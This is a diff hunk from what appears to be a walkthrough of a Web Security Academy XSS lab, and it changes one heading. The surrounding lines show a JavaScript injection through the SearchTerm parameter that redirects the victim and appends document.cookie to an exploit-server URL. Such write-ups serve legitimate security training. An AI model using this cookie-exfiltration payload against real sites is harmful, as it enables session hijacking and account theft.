@@ -17,7 +17,7 @@ location='https://<CHANGE-HERE>.web-security-academy.net/?SearchTerm="-(window["
 </script>
 ```
 
-## Before ENCODE the exploit by using BurpSuite Decoder:
+## Before ENCODE the exploit `part` by using BurpSuite Decoder:
 ```js
 "-(window["document"]["location"]="https://exploit-0af4008003a936d2c1563c1001a30084%2eexploit-server%2enet/?"+window["document"]["cookie"])-"
 ```
